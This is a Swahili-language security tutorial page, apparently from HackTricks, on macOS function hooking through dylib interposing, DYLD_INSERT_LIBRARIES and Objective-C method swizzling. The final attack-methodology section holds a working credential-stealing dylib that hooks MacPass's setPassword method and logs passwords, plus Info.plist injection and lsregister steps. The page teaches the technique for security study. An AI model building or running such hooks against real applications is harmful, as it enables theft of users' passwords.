# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Unda **dylib** yenye sehemu ya **`__interpose` (`__DATA___interpose`)** (au sehemu iliyo na alama ya **`S_INTERPOSING`**) inayojumuisha tuples za **function pointers** zinazorejelea **asili** na **mbadala** za kazi.

Kisha, **ingiza** dylib kwa kutumia **`DYLD_INSERT_LIBRARIES`** (kuingilia kunahitaji kutokea kabla ya programu kuu kupakia). Kwa wazi, [**vizuizi** vilivyowekwa kwa matumizi ya **`DYLD_INSERT_LIBRARIES`** vinatumika hapa pia](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Kigezo cha mazingira **`DYLD_PRINT_INTERPOSTING`** kinaweza kutumika kutatua matatizo ya interposing na kitaandika mchakato wa interpose.

Pia kumbuka kwamba **interposing inatokea kati ya mchakato na maktaba zilizoloadiwa**, haifanyi kazi na cache ya maktaba ya pamoja.

### Dynamic Interposing

Sasa pia inawezekana kuingiza kazi kwa njia ya dynamic kwa kutumia kazi **`dyld_dynamic_interpose`**. Hii inaruhusu kuingiza kazi kwa programu wakati wa utekelezaji badala ya kufanya hivyo tu kutoka mwanzoni.

Inahitajika tu kuashiria **tuples** za **kazi ya kubadilisha na kazi ya kubadilisha**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

Katika ObjectiveC hii ndiyo njia ambayo njia inaitwa kama: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Inahitajika **kitu**, **njia** na **params**. Na wakati njia inaitwa **msg inatumwa** kwa kutumia kazi **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Kitu ni **`someObject`**, njia ni **`@selector(method1p1:p2:)`** na hoja ni **value1**, **value2**.

Kufuata muundo wa vitu, inawezekana kufikia **array ya njia** ambapo **majina** na **viashiria** vya msimbo wa njia viko **pamoja**.

> [!CAUTION]
> Kumbuka kwamba kwa sababu njia na madarasa yanapatikana kulingana na majina yao, taarifa hii inahifadhiwa katika binary, hivyo inawezekana kuipata kwa `otool -ov </path/bin>` au [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Inawezekana kufikia taarifa za njia kama jina, idadi ya params au anwani kama katika mfano ufuatao:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

The function **`method_exchangeImplementations`** inaruhusu **kubadilisha** **anwani** ya **utekelezaji** wa **kazi moja kwa nyingine**.

> [!CAUTION]
> Hivyo wakati kazi inaitwa kile kinachokuwa **kinatekelezwa ni nyingine**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Katika kesi hii ikiwa **kanuni ya utekelezaji ya halali** in **hakiki** jina la **mbinu** inaweza **gundua** swizzling hii na kuzuia isifanye kazi.
>
> Mbinu ifuatayo haina kizuizi hiki.

### Method Swizzling with method_setImplementation

Muundo wa awali ni wa ajabu kwa sababu unabadilisha utekelezaji wa mbinu 2 kutoka kwa nyingine. Kwa kutumia kazi **`method_setImplementation`** unaweza **kubadilisha** **utekelezaji** wa **mbinu kwa nyingine**.

Kumbuka tu **kuhifadhi anwani ya utekelezaji wa ile ya asili** ikiwa unakusudia kuitwa kutoka kwa utekelezaji mpya kabla ya kuandika juu yake kwa sababu baadaye itakuwa ngumu zaidi kupata anwani hiyo.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Katika ukurasa huu njia tofauti za kuhooki kazi zilijadiliwa. Hata hivyo, zilihusisha **kukimbia msimbo ndani ya mchakato ili kushambulia**.

Ili kufanya hivyo, mbinu rahisi zaidi ya kutumia ni kuingiza [Dyld kupitia mabadiliko ya mazingira au hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Hata hivyo, nadhani hii inaweza pia kufanywa kupitia [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Hata hivyo, chaguo zote mbili ni **za mipaka** kwa **binaries/mchakato zisizo na ulinzi**. Angalia kila mbinu ili kujifunza zaidi kuhusu mipaka.

Hata hivyo, shambulio la kuhooki kazi ni maalum sana, mshambuliaji atafanya hivi ili **kuchukua taarifa nyeti kutoka ndani ya mchakato** (ikiwa sivyo ungeweza tu kufanya shambulio la kuingiza mchakato). Na taarifa hii nyeti inaweza kuwa katika programu zilizopakuliwa na mtumiaji kama MacPass.

Hivyo, njia ya mshambuliaji itakuwa ama kupata udhaifu au kuondoa saini ya programu, kuingiza **`DYLD_INSERT_LIBRARIES`** env variable kupitia Info.plist ya programu kwa kuongeza kitu kama:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
na kisha **re-register** programu:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Ongeza katika maktaba hiyo msimbo wa hooking ili kutoa taarifa: Nywila, ujumbe...

> [!CAUTION]
> Kumbuka kwamba katika matoleo mapya ya macOS ikiwa unatoa **saini** ya faili la programu na ilikuwa imefanywa kazi hapo awali, macOS **haitakuwa ikitekeleza programu** tena.

#### Mfano wa maktaba
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Marejeo

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
